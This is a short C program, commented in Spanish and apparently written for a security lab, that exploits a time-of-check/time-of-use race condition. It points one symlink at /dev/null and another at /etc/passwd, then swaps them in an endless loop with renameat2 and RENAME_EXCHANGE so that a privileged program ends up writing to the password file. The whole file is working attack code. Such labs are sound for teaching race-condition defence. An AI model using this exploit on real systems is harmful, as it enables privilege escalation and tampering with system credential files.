#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>

// Programa de ataque a la condicion de carrera
int main() {
    unsigned int flags = RENAME_EXCHANGE;

    // Realiza los links una vez antes de correr el loop, esto se hace de primero ya que
    // esto es lo que ocasiona un race condition en el script de ataque, por lo que
    // es necesario solo el uso de renameat2() para que se pueda realizar el ataque.
    unlink("/tmp/XYZ");
    symlink("/dev/null", "/tmp/XYZ");

    unlink("/tmp/lol");
    symlink("/etc/passwd", "/tmp/lol");
    while (1) {
        // Usar esta funcion es necesaria ya que hace un cambio atomico entre links
        // lo que permite evitar que haya una condicion cuando se esta haciendo
        // unlink o symlink
        renameat2(0, "/tmp/XYZ", 0, "/tmp/lol", flags);
    }
    return 0;
}